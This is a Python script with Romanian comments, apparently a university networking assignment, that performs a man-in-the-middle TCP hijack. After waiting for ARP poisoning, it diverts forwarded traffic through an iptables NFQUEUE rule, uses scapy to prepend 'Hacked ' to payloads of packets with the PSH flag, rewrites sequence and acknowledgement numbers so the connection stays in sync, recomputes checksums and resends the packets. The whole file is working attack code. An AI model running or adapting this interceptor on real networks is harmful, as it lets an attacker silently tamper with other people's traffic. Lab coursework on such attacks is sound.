# BIBLIOGRAFIE 
# pentru dictionarele de seq si ack https://github.com/DariusBuhai/FMI-Unibuc/tree/main/Year%20II/Semester%202/Retele%20de%20calculatoare/Teme/Tema%202/tcp_hijack

import os
import time
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ


hacked_seq = dict()
hacked_ack = dict()

def detect_and_alter_packet(packet):
    
    global hacked_seq 
    global hacked_ack

    #ip ia tot pachetul, inclusiv partea de tcp si raw
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw): #and (scapy_packet[IP].src == '198.7.0.2' or scapy_packet[IP].src == '172.7.0.2'):

        #print(scapy_packet[IP].show2())

        F = scapy_packet['TCP'].flags
        IPF = scapy_packet[IP].flags

        old_seq = scapy_packet['TCP'].seq
        old_ack = scapy_packet['TCP'].ack
        new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
        new_ack = hacked_ack[old_ack] if old_ack in hacked_ack.keys() else old_ack

        msg = scapy_packet[Raw].load

        #PSH - segmentul sa fie trimis la layer-ul de aplicatie cat mai rapid
        #print('BEFORE', scapy_packet[TCP].seq, ' ', scapy_packet[TCP].ack, scapy_packet[IP].src, '->')
        if F & 0x08: # DOAR DACA ARE FLAG PUSH, DIN CE VAD DOAR ALEA CONTIN PAYLOAD DATA, DECI PE ALEA VREM SA LE ALTERAM
            msg = scapy.packet.Raw(b'Hacked ' + bytes(scapy_packet[TCP].payload))
        

        hacked_seq[old_seq + len(scapy_packet['TCP'].payload)] = new_seq + len(msg)
        hacked_ack[new_seq + len(msg)] = old_seq + len(scapy_packet['TCP'].payload)

        # modificam load-ul pachetului si punem seq si ack noi
        scapy_packet[Raw].load = msg
        scapy_packet['TCP'].seq = new_seq
        scapy_packet['TCP'].ack = new_ack

        # stergem checksum pt IP si TCP si scapy le recalculeaza automat
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum

        #print('AFTER', scapy_packet[TCP].seq, ' ', scapy_packet[TCP].ack, scapy_packet[IP].src, '->')
        send(scapy_packet)

    else:
        packet.accept()
    


print('waitinng for ARP to poison')
time.sleep(2)
print("Started to alter packages")
#se defineste obicectul coada 
queue = NFQ()
try:
    #toate mesajele care trebuiesc forwardate prin routet(middle sub acoperire) vor fi preluate de coada 10
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()

